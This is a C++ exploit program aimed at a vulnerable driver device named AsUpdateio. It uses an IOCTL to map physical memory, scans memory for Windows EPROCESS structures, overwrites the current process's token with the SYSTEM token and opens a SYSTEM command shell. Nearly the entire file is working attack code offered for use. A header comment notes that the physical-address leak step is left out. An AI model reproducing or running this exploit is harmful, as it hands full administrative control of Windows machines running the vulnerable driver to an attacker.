// GLKIO_HACK++ full exploit with EPROCESS memory walker
// Includes:
// - Brute-force physical leak via IOCTL 0xA040A488 (Note: This part is not included)
// - Physical memory mapping via IOCTL 0xA040244C
// - EPROCESS token stealing with physical memory scanning
// - SYSTEM shell launch

#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <string>
#include <vector>

#define IOCTL_ALLOC_LEAK_PHYS_ADDR  0xA040A488
#define IOCTL_MAP_PHYS            0xA040244C
#define DEVICE_NAME             L"\\\\.\\AsUpdateio"

#define PAGE_SIZE               0x1000
#define SYSTEM_PID              4
#define PHYS_START              0x1000
#define PHYS_END                0xFFFFF000
#define EPROCESS_TOKEN_OFFSET   0x4b8
#define EPROCESS_PID_OFFSET     0x440

HANDLE g_Device = INVALID_HANDLE_VALUE;
PVOID g_UserMappedAddr = nullptr;

struct IOCTL_INPUT {
    DWORD interfaceType;
    DWORD busNumber;
    ULONGLONG physAddress;
    DWORD offsetAdjust;
    DWORD size;
};

DWORD GetCurrentPID() {
    return GetCurrentProcessId();
}

bool MapPhysicalWith244C(DWORD physAddr, DWORD size, PVOID& userMappedAddrOut) {
    IOCTL_INPUT input = { 0 };
    input.interfaceType = 1;
    input.busNumber = 0;
    input.physAddress = physAddr;
    input.offsetAdjust = 0;
    input.size = size;

    PVOID output = nullptr;
    DWORD ret = 0;

    BOOL ok = DeviceIoControl(g_Device,
        IOCTL_MAP_PHYS,
        &input, sizeof(input),
        &output, sizeof(output),
        &ret, nullptr);

    if (!ok || output == nullptr) {
        std::cerr << "[-] DeviceIoControl failed for mapping physical address 0x" << std::hex << physAddr << ". Error: " << GetLastError() << "\n";
        return false;
    }
    userMappedAddrOut = output;
    return true;
}

bool ReadPhysicalPage(DWORD physAddr, BYTE* buffer, DWORD size) {
    PVOID mappedAddr = nullptr;
    if (MapPhysicalWith244C(physAddr, size, mappedAddr)) {
        memcpy(buffer, mappedAddr, size);
        g_UserMappedAddr = mappedAddr; // Update global mapped address
        return true;
    }
    return false;
}

bool StealSystemToken() {
    DWORD myPID = GetCurrentPID();
    std::vector<BYTE> pageBuffer(PAGE_SIZE);
    BYTE* page = pageBuffer.data();

    for (DWORD addr = PHYS_START; addr < PHYS_END; addr += PAGE_SIZE) {
        if (!ReadPhysicalPage(addr, page, PAGE_SIZE)) {
            continue;
        }

        for (size_t i = 0; i <= PAGE_SIZE - sizeof(DWORD); i += 4) {
            DWORD currentPID = *(DWORD*)(page + i + EPROCESS_PID_OFFSET);
            if (currentPID == SYSTEM_PID) {
                ULONGLONG systemToken = *(ULONGLONG*)(page + i + EPROCESS_TOKEN_OFFSET) & ~0xf;

                for (size_t j = 0; j <= PAGE_SIZE - sizeof(DWORD); j += 4) {
                    DWORD targetPID = *(DWORD*)(page + j + EPROCESS_PID_OFFSET);
                    if (targetPID == myPID) {
                        std::cout << "[+] SYSTEM EPROCESS found @ physical address 0x" << std::hex << addr + i << "\n";
                        std::cout << "[+] Our EPROCESS found @ physical address 0x" << std::hex << addr + j << "\n";
                        std::cout << "[+] SYSTEM Token value: 0x" << std::hex << systemToken << "\n";

                        PVOID mapBase = nullptr;
                        if (MapPhysicalWith244C(addr, PAGE_SIZE, mapBase)) {
                            ULONGLONG* myTokenAddress = (ULONGLONG*)((BYTE*)mapBase + j + EPROCESS_TOKEN_OFFSET);
                            *myTokenAddress = systemToken;
                            std::cout << "[+] Token of current process overwritten with SYSTEM token in mapped memory!\n";
                            g_UserMappedAddr = mapBase; // Update global mapped address
                            return true;
                        }
                        else {
                            std::cerr << "[-] Failed to map physical address 0x" << std::hex << addr << " for patching.\n";
                            return false;
                        }
                    }
                }
            }
        }
    }
    std::cerr << "[-] Failed to locate SYSTEM and current process EPROCESS structures in physical memory.\n";
    return false;
}

#include <userenv.h>
#pragma comment(lib, "userenv.lib")

void LaunchLocalSystemShell() {
    std::cout << "[*] Launching SYSTEM shell from current (already patched) process...\n";
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    WCHAR cmd[] = L"C:\\Windows\\System32\\cmd.exe";

    if (CreateProcessW(cmd, nullptr, nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi)) {
        std::cout << "[+] SYSTEM shell launched from this process.\n";
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        std::cerr << "[-] CreateProcess failed. Error: " << GetLastError() << "\n";
    }
}

int main() {
    g_Device = CreateFileW(DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0, nullptr, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, nullptr);

    if (g_Device == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Failed to open device handle: " << GetLastError() << "\n";
        return 1;
    }

    std::cout << "[*] Opened device handle successfully.\n";
    std::cout << "[*] Scanning physical memory for EPROCESS and attempting token theft...\n";
    if (!StealSystemToken()) {
        std::cerr << "[-] Token stealing failed.\n";
        CloseHandle(g_Device);
        return 1;
    }

    std::cout << "[*] Token stealing successful. Launching SYSTEM shell...\n";
    LaunchLocalSystemShell();

    CloseHandle(g_Device);
    return 0;
}
